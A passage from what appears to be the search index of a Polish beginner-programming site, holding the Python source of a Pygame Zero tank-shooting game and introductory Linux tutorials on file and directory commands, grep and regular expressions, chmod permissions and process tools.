program","text":"<pre><code>import pgzrun\nimport math\nimport random\n\nWIDTH = 800\nHEIGHT = 600\n\nczolg = Actor(\"czolg.png\")\nczolg.x = WIDTH / 2\nczolg.y = HEIGHT / 2\nczolg.poziom = 1\nczolg.poc_v = 3\nczolg.odl_x = WIDTH\nczolg.odl_y = HEIGHT\nczolg.wrog_kat = 90\nczolg.zycie = 1\nczolg.punkty = 0\n\nlufa = Actor(\"lufa.png\", anchor=(\"middle\", \"bottom\"))\nlufa.x = WIDTH / 2\nlufa.y = HEIGHT / 2\nlufa.v = 3\n\nmedal = Actor(\"medal1.png\")\nmedal.x = 50\nmedal.y = 50\n\npociski = []\n\nwrogowie = []\n\nrakiety_male = []\n\nrakiety_duze = []\n\nwybuchy = []\n\nslady = []\n\ndef draw():\n    screen.fill((255, 255, 255))\n\n    for x in range(0, WIDTH + 128, 128):\n        for y in range(0, HEIGHT + 128, 128):\n            ziemia = Actor(\"ziemia1.png\")\n            ziemia.x = x\n            ziemia.y = y\n            ziemia.draw()\n\n    for slad in slady:\n        slad.draw()\n\n    for wyb in wybuchy:\n        wyb.draw()\n\n    for wrog in wrogowie:\n        wrog.draw()\n\n    for p in pociski:\n        p.draw()\n\n    for r in rakiety_male:\n        r.draw()\n\n    for r in rakiety_duze:\n        r.draw()\n\n    czolg.draw()\n\n    if czolg.zycie == 1:\n        lufa.draw()\n\n    if czolg.zycie == 0:\n        screen.draw.text(\"GAME OVER\", center=(WIDTH / 2, HEIGHT / 2 - 200), fontsize=100, color=\"red\")\n\n    if czolg.punkty &gt;= 10:\n        if czolg.punkty &gt;= 30:\n            medal.image = \"medal3\"\n        elif czolg.punkty &gt;= 20:\n            medal.image = \"medal2\"\n\n        medal.draw()\n\ndef update():\n    if keyboard.LEFT and not keyboard.SPACE:\n        lufa.angle += lufa.v\n    if keyboard.RIGHT and not keyboard.SPACE:\n        lufa.angle -= lufa.v\n\n    akt_pociski()\n    akt_wrogowie()\n    akt_rakiety_male()\n    akt_rakiety_duze()\n    akt_wybuchy()\n    akt_slady()\n\ndef akt_slady():\n    for slad in slady[:]:\n        slad.czas -= 1\n        if slad.czas &lt;= 0:\n            slady.remove(slad)\n\ndef akt_wybuchy():\n    for wyb in wybuchy[:]:\n        wyb.czas -= 1\n        if wyb.czas &lt;= 0:\n            wybuchy.remove(wyb)\n\ndef akt_rakiety_duze():\n    for rak in rakiety_duze:\n        rak.x += math.sin(math.radians(rak.angle - 180)) * rak.v\n        rak.y += math.cos(math.radians(rak.angle - 180)) * rak.v\n\n    for rak in rakiety_duze:\n        for wrog in wrogowie:\n            if rak.collidepoint(wrog.pos):\n                for wrog2 in wrogowie[:]:\n                    odl = math.sqrt((wrog2.x - rak.x) ** 2 + (wrog2.y - rak.y) ** 2)\n                    if odl &lt;= rak.promien:\n                        wybuch = Actor(\"wybuch3.png\")\n                        wybuch.x = wrog2.x\n                        wybuch.y = wrog2.y\n                        wybuch.angle = wrog2.angle\n                        wybuch.czas = 10\n                        wybuchy.append(wybuch)\n                        wrogowie.remove(wrog2)\n                        czolg.punkty += 2\n                rakiety_duze.remove(rak)\n                break\n\ndef akt_rakiety_male():\n    for rak in rakiety_male:\n        min_odl = 1000000000000\n        min_wrog = None\n\n        for wrog in wrogowie:\n            odl = (wrog.x - rak.x) ** 2 + (wrog.y - rak.y) ** 2\n            if odl &lt; min_odl:\n                min_odl = odl\n                min_wrog = wrog\n\n        if min_wrog != None:\n            rak.angle = rak.angle_to(min_wrog) - 90\n        rak.x += math.sin(math.radians(rak.angle - 180)) * rak.v\n        rak.y += math.cos(math.radians(rak.angle - 180)) * rak.v\n\n    for rak in rakiety_male:\n        for wrog in wrogowie:\n            if rak.collidepoint(wrog.pos):\n                wybuch = Actor(\"wybuch3.png\")\n                wybuch.x = wrog.x\n                wybuch.y = wrog.y\n                wybuch.angle = wrog.angle\n                wybuch.czas = 10\n                wybuchy.append(wybuch)\n                wrogowie.remove(wrog)\n                rakiety_male.remove(rak)\n                czolg.punkty += 2\n                break\n\ndef akt_pociski():\n    for poc in pociski:\n        poc.x += math.sin(math.radians(poc.angle - 180)) * poc.v\n        poc.y += math.cos(math.radians(poc.angle - 180)) * poc.v\n\n    for poc in pociski:\n        for wrog in wrogowie:\n            if poc.colliderect(wrog):\n                wybuch = Actor(\"wybuch3.png\")\n                wybuch.x = wrog.x\n                wybuch.y = wrog.y\n                wybuch.angle = wrog.angle\n                wybuch.czas = 10\n                wybuchy.append(wybuch)\n                wrogowie.remove(wrog)\n                pociski.remove(poc)\n                czolg.punkty += 2\n                break\n\ndef akt_wrogowie():\n    if random.randint(0, 200) &lt; czolg.poziom:\n        wrog = Actor(\"wrog1.png\")\n        kat = random.randint(0, 360)\n        wrog.x = WIDTH / 2 + math.sin(math.radians(kat)) * czolg.odl_x\n        wrog.y = HEIGHT / 2 + math.cos(math.radians(kat)) * czolg.odl_y\n        wrog.v = 2\n        wrog.slad = 0\n        wrogowie.append(wrog)\n\n    for wrog in wrogowie:\n        wrog.angle = wrog.angle_to(czolg) + czolg.wrog_kat\n        wrog.x += math.sin(math.radians(wrog.angle)) * wrog.v\n        wrog.y += math.cos(math.radians(wrog.angle)) * wrog.v\n        wrog.slad -= 1\n        if wrog.slad &lt;= 0:\n            wrog.slad = 20\n            slad = Actor(\"slady1.png\")\n            slad.x = wrog.x\n            slad.y = wrog.y\n            slad.angle = wrog.angle\n            slad.czas = 100\n            slady.append(slad)\n        if wrog.colliderect(czolg):\n            czolg.zycie = 0\n            czolg.image = \"wybuch1.png\"\n\ndef on_key_down(key):\n    if key == keys.SPACE and czolg.zycie == 1:\n        poc = Actor(\"pocisk.png\")\n        poc.angle = lufa.angle\n        poc.x = lufa.x\n        poc.y = lufa.y\n        poc.v = czolg.poc_v\n        pociski.append(poc)\n\n    if key == keys.Z and czolg.zycie == 1:\n        rak = Actor(\"rakieta1.png\")\n        rak.angle = lufa.angle\n        rak.x = lufa.x\n        rak.y = lufa.y\n        rak.v = czolg.poc_v\n        rakiety_male.append(rak)\n\n    if key == keys.X and czolg.zycie == 1:\n        rak = Actor(\"rakieta2.png\")\n        rak.angle = lufa.angle\n        rak.x = lufa.x\n        rak.y = lufa.y\n        rak.v = czolg.poc_v\n        rak.promien = 300\n        rakiety_duze.append(rak)\n\ndef nastepny_poziom():\n    czolg.poc_v += 0.25\n    czolg.poziom += 1\n    if czolg.poziom &gt;= 5:\n        czolg.odl_x = WIDTH / 2 - czolg.poziom * 2\n        czolg.odl_y = HEIGHT / 2 - czolg.poziom * 2\n        czolg.wrog_kat = 170\n\nclock.schedule_interval(nastepny_poziom, 1)\npgzrun.go()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/tanks-2/#testujemy-dziaanie","title":"Testujemy dzia\u0142anie","text":"<p>TODO</p>"},{"location":"linux/files/","title":"Pliki","text":""},{"location":"linux/files/#wstep","title":"Wst\u0119p","text":"<p>Pliki - bez nich ci\u0119\u017cko pracowa\u0107.  Przybli\u017cymy wi\u0119c kilka podstawowych polece\u0144 do operacji na plikach w systemie Linux.</p>"},{"location":"linux/files/#utworzenie-pustego-pliku-touch","title":"Utworzenie pustego pliku: touch","text":"<p>Do utworzenia pustego pliku skorzystamy z polecenia touch.</p>"},{"location":"linux/files/#skadnia","title":"Sk\u0142adnia","text":"<pre><code>touch &lt;nazwa pliku&gt;\ntouch &lt;nazwa pierwszego pliku&gt; &lt;nazwa drugiego pliku&gt; ...\n</code></pre>"},{"location":"linux/files/#wyswietlenie-zawartosci-pliku-cat","title":"Wy\u015bwietlenie zawarto\u015bci pliku: cat","text":"<p>Jednym z przydatnych polece\u0144, kt\u00f3re mo\u017ce pos\u0142u\u017cy\u0107 tak\u017ce do wy\u015bwietlenia zawarto\u015bci plik\u00f3w, jest polecenie cat.</p>"},{"location":"linux/files/#skadnia_1","title":"Sk\u0142adnia","text":"<pre><code>cat &lt;nazwa pliku&gt;\n</code></pre>"},{"location":"linux/files/#usuwanie-pliku-rm","title":"Usuwanie pliku: rm","text":"<p>Aby usun\u0105\u0107 plik skorzystamy z polecenia rm.</p> <p>Warning</p> <p>Uwaga</p> <p>Pliki usuni\u0119te za pomoc\u0105 polecenia <code>rm</code> nie trafiaj\u0105 do kosza, tylko s\u0105 bezpowrotnie usuwane. Nale\u017cy wi\u0119c obchodzi\u0107 si\u0119 z tym poleceniem bardzo ostro\u017cnie.</p>"},{"location":"linux/files/#skadnia_2","title":"Sk\u0142adnia","text":"<pre><code>rm &lt;nazwa pliku&gt;\n</code></pre>"},{"location":"linux/files/#opcje","title":"Opcje","text":"<p>Polecenie <code>rm</code> posiada kilka przydatnych opcji. Opiszemy niekt\u00f3re z nich.</p>"},{"location":"linux/files/#usuwanie-bez-potwierdzenia-f","title":"Usuwanie bez potwierdzenia: -f","text":"<p>Opcja <code>-f</code> (ang. force) powoduje usuni\u0119cie plik\u00f3w bez pytania o potwierdzenie operacji.</p>"},{"location":"linux/files/#rekursywne-usuwanie-r","title":"Rekursywne usuwanie: -R","text":"<p>Opcja <code>-R</code> (ang. recursive) powoduje usuni\u0119cie podanego katalogu wraz z jego pe\u0142n\u0105 zawarto\u015bci\u0105.</p>"},{"location":"linux/files/#kopiowanie-plikow-cp","title":"Kopiowanie plik\u00f3w: cp","text":"<p>Do skopiowania pliku skorzystamy z polecenia cp (ang. copy).</p>"},{"location":"linux/files/#skadnia_3","title":"Sk\u0142adnia","text":"<pre><code>cp &lt;\u015bcie\u017cka do istniej\u0105cego pliku&gt; &lt;\u015bcie\u017cka do nowego pliku&gt;\n</code></pre>"},{"location":"linux/files/#przeniesienie-pliku-mv","title":"Przeniesienie pliku: mv","text":"<p>Nie zawsze chcemy kopiowa\u0107 pliki, czasem chcemy je po prostu przenie\u015b\u0107, lub zmieni\u0107 ich nazw\u0119. Wykorzystamy do tego polecenie mv (ang. move).</p>"},{"location":"linux/files/#skadnia_4","title":"Sk\u0142adnia","text":"<pre><code>mv &lt;\u015bcie\u017cka do istniej\u0105cego pliku&gt; &lt;\u015bcie\u017cka do nowej lokalizacji&gt;\n</code></pre>"},{"location":"linux/files/#okreslenie-typu-pliku-file","title":"Okre\u015blenie typu pliku: file","text":"<p>Poniewa\u017c w systemie Linux rozszerzenia nie maj\u0105 znaczenia, aby pozna\u0107 typ pliku mo\u017cemy skorzysta\u0107 z polecenia file.</p>"},{"location":"linux/files/#skadnia_5","title":"Sk\u0142adnia","text":"<pre><code>file &lt;\u015bcie\u017cka do pliku&gt;\n</code></pre>"},{"location":"linux/folders/","title":"Katalogi","text":""},{"location":"linux/folders/#wstep","title":"Wst\u0119p","text":"<p>Aby sprawnie pos\u0142ugiwa\u0107 si\u0119 terminalem, musimy wiedzie\u0107, jak porusza\u0107 si\u0119 po strukturze katalog\u00f3w. Om\u00f3wimy wi\u0119c podstawowe polecenia pozwalaj\u0105ce na poruszanie si\u0119 po drzewie katalog\u00f3w, a tak\u017ce na tworzenie nowych katalog\u00f3w i usuwanie ich.</p>"},{"location":"linux/folders/#obecna-sciezka-pwd","title":"Obecna \u015bcie\u017cka: pwd","text":"<p>W trakcie przechodzenia po r\u00f3\u017cnych katalogach \u0142atwo si\u0119 pogubi\u0107. Aby sprawdzi\u0107, pod jak\u0105 \u015bcie\u017ck\u0105 si\u0119 aktualnie znajdujemy, u\u017cyjemy polecenia pwd (ang. print working directory).</p>"},{"location":"linux/folders/#skadnia","title":"Sk\u0142adnia","text":"<pre><code>pwd\n</code></pre>"},{"location":"linux/folders/#zmiana-katalogu-cd","title":"Zmiana katalogu: cd","text":"<p>Do poruszania si\u0119 po systemie niezb\u0119dne b\u0119dzie polecenie zmiany katalogu: cd (ang. change directory).</p>"},{"location":"linux/folders/#skadnia_1","title":"Sk\u0142adnia","text":"<pre><code>cd &lt;nazwa katalogu lub \u015bcie\u017cka&gt;\n</code></pre>"},{"location":"linux/folders/#utworzenie-katalogu-mkdir","title":"Utworzenie katalogu: mkdir","text":"<p>Czasem bywa tak, \u017ce potrzebujemy utworzy\u0107 nowy katalog. Przyda nam si\u0119 wtedy polecenie mkdir (ang. make directory).</p>"},{"location":"linux/folders/#skadnia_2","title":"Sk\u0142adnia","text":"<pre><code>mkdir &lt;nazwa katalogu&gt;\n</code></pre>"},{"location":"linux/folders/#usuwanie-katalogu-rmdir","title":"Usuwanie katalogu: rmdir","text":"<p>Skoro tworzymy katalogi, to powinni\u015bmy tak\u017ce wiedzie\u0107, jak je usuwa\u0107. U\u017cyjemy do tego polecenia rmdir (ang. remove directory).</p> <p>Warning</p> <p>Domy\u015blnie za pomoc\u0105 polecenia <code>rmdir</code> mo\u017cemy usuwa\u0107 tylko puste katalogi.</p>"},{"location":"linux/folders/#skadnia_3","title":"Sk\u0142adnia","text":"<pre><code>rmdir &lt;nazwa katalogu&gt;\n</code></pre>"},{"location":"linux/folders/#wyswietlenie-zawartosci-katalogu-ls","title":"Wy\u015bwietlenie zawarto\u015bci katalogu: ls","text":"<p>Wiemy ju\u017c jak tworzy\u0107 i usuwa\u0107, czas wi\u0119c dowiedzie\u0107 si\u0119, jak podejrze\u0107 zawarto\u015b\u0107 obecnego katalogu. Do tego wykorzystamy polecenie ls (ang. list). Opcjonalnie do polecenia mo\u017cemy poda\u0107 \u015bcie\u017ck\u0119 do katalogu, kt\u00f3rego zawarto\u015b\u0107 chcemy wy\u015bwietli\u0107.</p>"},{"location":"linux/folders/#skadnia_4","title":"Sk\u0142adnia","text":"<pre><code>ls [\u015bcie\u017cka]\n</code></pre>"},{"location":"linux/folders/#opcje","title":"Opcje","text":"<p>Polecenie <code>ls</code> posiada kilka przydatnych opcji. Opiszemy niekt\u00f3re z nich.</p>"},{"location":"linux/folders/#wyswietlenie-wszystkich-plikow-a","title":"Wy\u015bwietlenie wszystkich plik\u00f3w: -a","text":"<p>Opcja <code>-a</code> (ang. all) powoduje wy\u015bwietlenie tak\u017ce ukrytych plik\u00f3w, czyli takich, kt\u00f3rych nazwa zaczyna si\u0119 od kropki.</p>"},{"location":"linux/folders/#wyswietlenie-szczegoow-l","title":"Wy\u015bwietlenie szczeg\u00f3\u0142\u00f3w: -l","text":"<p>Opcja <code>-l</code> powoduje wy\u015bwietlenie bardziej szczeg\u00f3\u0142owej listy plik\u00f3w.</p>"},{"location":"linux/folders/#rekursywne-wylistowanie-r","title":"Rekursywne wylistowanie: -R","text":"<p>Opcja <code>-R</code> (ang. recursive) powoduje wy\u015bwietlenie nie tylko zawarto\u015bci podanego katalogu, ale tak\u017ce zawarto\u015bci katalog\u00f3w w nim zawartych, a tak\u017ce zawarto\u015bci katalog\u00f3w w nich zawartych itd. Jest to rekursywne przegl\u0105danie drzewa katalog\u00f3w.</p>"},{"location":"linux/grep/","title":"Grep","text":""},{"location":"linux/grep/#wstep","title":"Wst\u0119p","text":"<p>Niejednokrotnie zdarza si\u0119, \u017ce przegl\u0105daj\u0105c r\u00f3\u017cne pliki, czy wykonuj\u0105c rozmaite polecenia, na ekranie konsoli pojawia si\u0119 wynik w postaci d\u0142ugiego bloku tekstu. Cz\u0119sto interesuj\u0105 nas konkretne informacje zawarte w tym tek\u015bcie. Dla przyk\u0142adu, powiedzmy \u017ce przegl\u0105damy logi systemu.  Chcemy zobaczy\u0107, kiedy logowa\u0142 si\u0119 u\u017cytkownik blackbat. Naj\u0142atwiej by\u0142oby wi\u0119c przeszuka\u0107 plik w poszukiwaniu wspomnianego u\u017cytkownika. Takie przeszukiwanie umo\u017cliwia nam polecenie grep (ang. Globally search for Regular Expression and Print out).</p>"},{"location":"linux/grep/#podstawowe-opcje","title":"Podstawowe opcje","text":"<p>Jak wi\u0119kszo\u015b\u0107 polece\u0144, tak\u017ce grep posiada wiele przydatnych opcji. Poni\u017cej om\u00f3wimy kilka z nich.</p>"},{"location":"linux/grep/#numery-linii-n","title":"Numery linii: -n","text":"<p>W celu \u0142atwiejszego przegl\u0105dania i analizowania wyj\u015bcia, jakie wyprodukuje <code>grep</code>, mo\u017cemy w\u0142\u0105czy\u0107 wy\u015bwietlanie numer\u00f3w linii za pomoc\u0105 opcji -n.</p>"},{"location":"linux/grep/#skadnia","title":"Sk\u0142adnia","text":"<pre><code>grep -n\ngrep --line-number\n</code></pre>"},{"location":"linux/grep/#zliczanie-pasujacych-wynikow-c","title":"Zliczanie pasuj\u0105cych wynik\u00f3w: -c","text":"<p>Nie zawsze interesuj\u0105 nas linie zawieraj\u0105ce dany fragment, czasem chcemy po prostu wiedzie\u0107, ile ich jest. W tym celu przydatna b\u0119dzie opcja -c.</p>"},{"location":"linux/grep/#skadnia_1","title":"Sk\u0142adnia","text":"<pre><code>grep -c\ngrep --count\n</code></pre>"},{"location":"linux/grep/#odwrocenie-dopasowania-v","title":"Odwr\u00f3cenie dopasowania: -v","text":"<p>Czasem potrzebujemy znale\u017a\u0107 linie, w kt\u00f3rych zadany fragment nie wyst\u0119puje. W tym celu mo\u017cemy skorzysta\u0107 z opcji, kt\u00f3ra odwraca wyszukiwanie: -v.</p>"},{"location":"linux/grep/#skadnia_2","title":"Sk\u0142adnia","text":"<pre><code>grep -v\ngrep --invert-match\n</code></pre>"},{"location":"linux/grep/#ignorowanie-wielkosci-liter-i","title":"Ignorowanie wielko\u015bci liter: -i","text":"<p>Jak to m\u00f3wi\u0105, rozmiar nie ma znaczenia. Mo\u017cemy t\u0119 my\u015bl przekaza\u0107 tak\u017ce do polecenia <code>grep</code> za pomoc\u0105 opcji -i.</p>"},{"location":"linux/grep/#skadnia_3","title":"Sk\u0142adnia","text":"<pre><code>grep -i\ngrep --ignore-case\n</code></pre>"},{"location":"linux/grep/#dopasowanie-penych-wyrazow-w","title":"Dopasowanie pe\u0142nych wyraz\u00f3w: -w","text":"<p>Je\u017celi chcemy dopasowa\u0107 jedynie pe\u0142ne wyrazy, a nie ich fragmenty, mo\u017cemy skorzysta\u0107 z opcji -w.</p>"},{"location":"linux/grep/#skadnia_4","title":"Sk\u0142adnia","text":"<pre><code>grep -w\ngrep --word-regexp\n</code></pre>"},{"location":"linux/grep/#wypisywanie-tylko-dopasowania-o","title":"Wypisywanie tylko dopasowania: -o","text":"<p>Aby wy\u015bwietli\u0107 jedynie dopasowane fragmenty, a nie ca\u0142e linie, u\u017cyjemy opcji -o.</p>"},{"location":"linux/grep/#skadnia_5","title":"Sk\u0142adnia","text":"<pre><code>grep -o\ngrep --only-matching\n</code></pre>"},{"location":"linux/grep/#wypisanie-wczesniejszych-linii-b","title":"Wypisanie wcze\u015bniejszych linii: -B","text":"<p>Czasem potrzebujemy zobaczy\u0107 nie tylko lini\u0119 z dopasowanym tekstem, ale tak\u017ce klika wcze\u015bniejszych. Mo\u017cemy to zrobi\u0107 za pomoc\u0105 opcji -B.</p>"},{"location":"linux/grep/#skadnia_6","title":"Sk\u0142adnia","text":"<pre><code>grep -B &lt;liczba&gt;\ngrep --before-context &lt;liczba&gt;\n</code></pre>"},{"location":"linux/grep/#wypisanie-kolejnych-linii-a","title":"Wypisanie kolejnych linii: -A","text":"<p>Czasem potrzebujemy zobaczy\u0107 nie tylko lini\u0119 z dopasowanym tekstem, ale tak\u017ce klika kolejnych. Mo\u017cemy to zrobi\u0107 za pomoc\u0105 opcji -A.</p>"},{"location":"linux/grep/#skadnia_7","title":"Sk\u0142adnia","text":"<pre><code>grep -A &lt;liczba&gt;\ngrep --after-context &lt;liczba&gt;\n</code></pre>"},{"location":"linux/grep/#wyrazenia-regularne","title":"Wyra\u017cenia regularne","text":"<p>Wyszukiwanie za pomoc\u0105 fragmentu tekstu ma swoje ograniczenia. Nie zawsze chcemy wyszuka\u0107 konkretny tekst, czasem chcemy znale\u017a\u0107 wyst\u0105pienia zadanego formatu. Za\u0142\u00f3\u017cmy, \u017ce przegl\u0105daj\u0105c logi systemowe chcemy znale\u017a\u0107 wszystkie linie zawieraj\u0105ce znacznik czasowy w formacie hhss. Nie interesuje nas konkretny czas, ale sam fakt wyst\u0119powania jakiego\u015b czasu w danej linii. Takie dopasowanie mo\u017cemy uzyska\u0107 za pomoc\u0105 wyra\u017ce\u0144 regularnych.</p> <p>Przedstawimy teraz kilka przydatnych wzorc\u00f3w dopasowa\u0144.</p>"},{"location":"linux/grep/#poczatek-linii","title":"Pocz\u0105tek linii: ^","text":"<p>Je\u017celi szukamy linii, kt\u00f3re zaczynaj\u0105 si\u0119 od zadanego wzorca, mo\u017cemy skorzysta\u0107 z symbolu ^.</p>"},{"location":"linux/grep/#przykad","title":"Przyk\u0142ad","text":"<pre><code>^start\n</code></pre>"},{"location":"linux/grep/#koniec-linii","title":"Koniec linii: $","text":"<p>Je\u017celi szukamy linii, kt\u00f3re ko\u0144cz\u0105 si\u0119 zadanym wzorcem, mo\u017cemy skorzysta\u0107 z symbolu $.</p>"},{"location":"linux/grep/#przykad_1","title":"Przyk\u0142ad","text":"<pre><code>start$\n</code></pre>"},{"location":"linux/grep/#dopasowanie-dowolnego-znaku","title":"Dopasowanie dowolnego znaku: .","text":"<p>W celu dopasowania dowolnego znaku w zadanym miejscu wzorca, u\u017cyjemy znaku kropki.</p>"},{"location":"linux/grep/#powtarzanie-wzorca-zero-lub-wiecej-razy","title":"Powtarzanie wzorca zero lub wi\u0119cej razy: *","text":"<p>Za pomoc\u0105 symbolu gwiazdki mo\u017cemy okre\u015bli\u0107, \u017ce wyst\u0119puj\u0105cy przed ni\u0105 fragment wzorca powinien wyst\u0105pi\u0107 zero lub wi\u0119cej razy. Fragmenty wzorca mo\u017cemy otacza\u0107 nawiasami okr\u0105g\u0142ymi, \u017ceby uwzgl\u0119dni\u0107 wi\u0119kszy fragment ni\u017c tylko pojedynczy znak.</p>"},{"location":"linux/grep/#dopasowanie-do-zbioru-znakow","title":"Dopasowanie do zbioru znak\u00f3w: []","text":"<p>U\u017cywaj\u0105c notacji nawias\u00f3w kwadratowych mo\u017cemy okre\u015bli\u0107, jakie znaki mog\u0105 zosta\u0107 dopasowane w zadanym miejscu. Dla przyk\u0142adu, je\u017celi chcieliby\u015bmy dopasowa\u0107 jedynie litery a lub b to u\u017cyliby\u015bmy wyra\u017cenia [ab].</p>"},{"location":"linux/grep/#wykluczenie-znakow-z-dopasowania","title":"Wykluczenie znak\u00f3w z dopasowania: [^]","text":"<p>Mo\u017cemy tak\u017ce wykluczy\u0107 zadane znaki z dopasowania w konkretnym miejscu wzorca u\u017cywaj\u0105c nawias\u00f3w kwadratowych i znaku ^. Dla przyk\u0142adu, je\u017celi chcieliby\u015bmy dopasowa\u0107 wszystkie znaki poza a i b zapisaliby\u015bmy [^ab].</p>"},{"location":"linux/grep/#dopasowanie-znakow-z-przedziau","title":"Dopasowanie znak\u00f3w z przedzia\u0142u","text":"<p>U\u017cywaj\u0105c nawias\u00f3w kwadratowych mo\u017cemy tak\u017ce okre\u015bli\u0107 przedzia\u0142 dopuszczalnych znak\u00f3w. Dla przyk\u0142adu, je\u017celi chcieliby\u015bmy dopasowa\u0107 tylko cyfry, napisaliby\u015bmy [0-9].</p>"},{"location":"linux/grep/#sciaga","title":"\u015aci\u0105ga","text":"<p>\u015aci\u0105ga</p>"},{"location":"linux/introduction/","title":"Wprowadzenie do systemu Linux","text":""},{"location":"linux/introduction/#prezentacja","title":"Prezentacja","text":"<p> Prezentacja</p>"},{"location":"linux/permissions/","title":"Prawa dost\u0119pu","text":""},{"location":"linux/permissions/#wstep","title":"Wst\u0119p","text":"<p>W systemie Linux ka\u017cdy plik ma przypisane prawa dost\u0119pu dla w\u0142a\u015bciciela pliku, grupy u\u017cytkownik\u00f3w i wszystkich innych. Prawa okre\u015blane s\u0105 za pomoc\u0105 ci\u0105gu znak\u00f3w rwx i mo\u017cna je zobaczy\u0107 u\u017cywaj\u0105c polecenia <code>ls -l</code>.</p>"},{"location":"linux/permissions/#kolejnosc-uprawnien","title":"Kolejno\u015b\u0107 uprawnie\u0144","text":"d rwx rwx rwx Typ pliku Uprawnienia w\u0142a\u015bciciela pliku Uprawnienia dla grupy Uprawnienia dla pozosta\u0142ych"},{"location":"linux/permissions/#typ-uprawnien","title":"Typ uprawnie\u0144","text":"Warto\u015b\u0107 \u00f3semkowa Oznaczenie Znaczenie 4 r Prawo do odczytu 2 w Prawo do zapisu 1 x Prawo do wykonywania Warto\u015b\u0107 \u00f3semkowa Oznaczenie Prawa dost\u0119pu 7 rwx czytanie, pisanie, wykonywanie 6 rw- czytanie i pisanie 5 r-x czytanie i wykonywanie 4 r-- czytanie 3 -wx wykonywanie i pisanie 2 -w- pisanie 1 --x wykonywanie 0 --- brak"},{"location":"linux/permissions/#typ-pliku","title":"Typ pliku","text":"Oznaczenie Znaczenie - Zwyk\u0142y plik d Katalog l Dowi\u0105zanie symboliczne s Gniazdo f FIFO c Urz\u0105dzenie znakowe b Urz\u0105dzenie blokowe"},{"location":"linux/permissions/#nadanie-uprawnien","title":"Nadanie uprawnie\u0144","text":"<p>Do zmiany uprawnie\u0144 nadanych plikowi s\u0142u\u017cy polecenie <code>chmod</code>. Aby m\u00f3c zmieni\u0107 uprawnienia, musimy mie\u0107 do tego odpowiednie prawa, tzn. by\u0107 w\u0142a\u015bcicielem pliku, albo administratorem.</p>"},{"location":"linux/permissions/#chmod","title":"chmod","text":"<p>Sk\u0142adnia polecenia wygl\u0105da nast\u0119puj\u0105co:</p> <p><code>chmod [uprawnienia] [plik]</code></p>"},{"location":"linux/permissions/#przykad","title":"Przyk\u0142ad","text":"<p><code>chmod 600 plik.txt</code></p> <p>Oznacza nadanie uprawnie\u0144 do czytania i pisania w\u0142a\u015bcicielowi pliku (6) i brak uprawnie\u0144 dla grupy (0) i pozosta\u0142ych u\u017cytkownik\u00f3w (0).</p>"},{"location":"linux/permissions/#zmiana-uprawnien","title":"Zmiana uprawnie\u0144","text":"<p>Za pomoc\u0105 polecenia chmod mo\u017cemy nie tylko nadawa\u0107 uprawnienia, ale tak\u017ce modyfikowa\u0107 ju\u017c nadane. W\u00f3wczas, zamiast podawa\u0107 pe\u0142ne uprawnienia, u\u017cyjemy sk\u0142adni:</p> <p>[jednostka][operacja][uprawnienia]</p>"},{"location":"linux/permissions/#dozwolone-oznaczenia-jednostki","title":"Dozwolone oznaczenia jednostki","text":"Oznaczenie Znaczenie u U\u017cytkownik (user) g Grupa (group) o Pozostali (others) a Wszyscy (all)"},{"location":"linux/permissions/#dozwolone-operacje","title":"Dozwolone operacje","text":"Oznaczenie Znaczenie + Dodanie uprawnienia - Usuni\u0119cie uprawnienia = Ustanowienie uprawnienia"},{"location":"linux/permissions/#przykad_1","title":"Przyk\u0142ad","text":"<p><code>chmod u+rx plik.txt</code></p> <p>Oznacza dodanie uprawnie\u0144 do czytania i wykonywania w\u0142a\u015bcicielowi pliku.</p>"},{"location":"linux/permissions/#sciaga","title":"\u015aci\u0105ga","text":"<p>\u015aci\u0105ga</p>"},{"location":"linux/processes/","title":"Procesy","text":""},{"location":"linux/processes/#procesy-dziaajace-w-tle","title":"Procesy dzia\u0142aj\u0105ce w tle","text":"<p>Domy\u015blnie, jak uruchamiamy jaki\u015b proces, program, to urachmiany jest \"na planie g\u0142\u00f3wnym\". Mi\u0119dzy innymi oznacza to, \u017ce program \"blokuje\" nam terminal. Istnieje jednak mo\u017cliwo\u015b\u0107 uruchomienia procesu w tle, albo u\u015bpienia dzia\u0142aj\u0105cego procesu.</p>"},{"location":"linux/processes/#uruchomienie-procesu-w-tle","title":"Uruchomienie procesu w tle","text":"<p>Aby uruchomi\u0107 proces w tle, nale\u017cy po poleceniu doda\u0107 znak ampersant: &amp;.</p>"},{"location":"linux/processes/#przykad","title":"Przyk\u0142ad","text":"<pre><code>./program &amp;\n</code></pre>"},{"location":"linux/processes/#uspienie-procesu","title":"U\u015bpienie procesu","text":"<p>Aby u\u015bpi\u0107 dzia\u0142aj\u0105cy na pierwszym planie proces, nale\u017cy u\u017cy\u0107 skr\u00f3tu CTRL+Z.</p>"},{"location":"linux/processes/#przeniesienie-procesu-na-pierwszy-plan","title":"Przeniesienie procesu na pierwszy plan","text":"<p>Aby przenie\u015b\u0107 u\u015bpiony proces na pierwszy plan, u\u017cyjemy polecenia fg (ang. foreground).</p>"},{"location":"linux/processes/#ps","title":"ps","text":"<p>Polecenie ps pozwala nam zobaczy\u0107 list\u0119 aktualnie uruchomionych proces\u00f3w. Pozwala nam stwierdzi\u0107, czym zajmuj\u0105 si\u0119 poszczeg\u00f3lne procesy, ile pami\u0119ci zu\u017cywaj\u0105, ile czasu procesora potrzebuj\u0105 itp.</p> <p>Polecenie ps wy\u015bwietla dane w nast\u0119puj\u0105cych kolumnach: * PID: identyfikator procesu * TTY: type terminala, na kt\u00f3rym proces jest uruchomiony * TIME: ile czasu procesora jest zu\u017cywane na dzia\u0142anie procesu * CMD: nazwa polecenia</p>"},{"location":"linux/processes/#przykadowe-opcje","title":"Przyk\u0142adowe opcje","text":"<ul> <li>-ef: wy\u015bwietla wszystkie procesy w pe\u0142nym formacie</li> <li>-u username: wy\u015bwietla procesy konkretnego u\u017cytkownika</li> <li>-C cmd: wy\u015bwietla procesy dla zadanego polecenia</li> <li>-p PID: wy\u015bwietla proces z zadanym identyfikatorem</li> <li>-L: wy\u015bwietla wszystkie w\u0105tki dla zadanego procesu</li> </ul>"},{"location":"linux/processes/#top","title":"top","text":"<p>Polecenie top wy\u015bwietla wszystkie dzia\u0142aj\u0105ce procesy w czasie rzeczywistym. Jest przydatne do monitorowania wydajno\u015bci systemu. G\u0142\u00f3wnie jest u\u017cywane do sprawdzenia obci\u0105\u017cenia systemu przez administrator\u00f3w.</p>"},{"location":"linux/processes/#znaczenie-wyjscia","title":"Znaczenie wyj\u015bcia","text":""},{"location":"linux/processes/#linia-1","title":"Linia 1","text":"<ul> <li>czas</li> <li>jak d\u0142ugo system 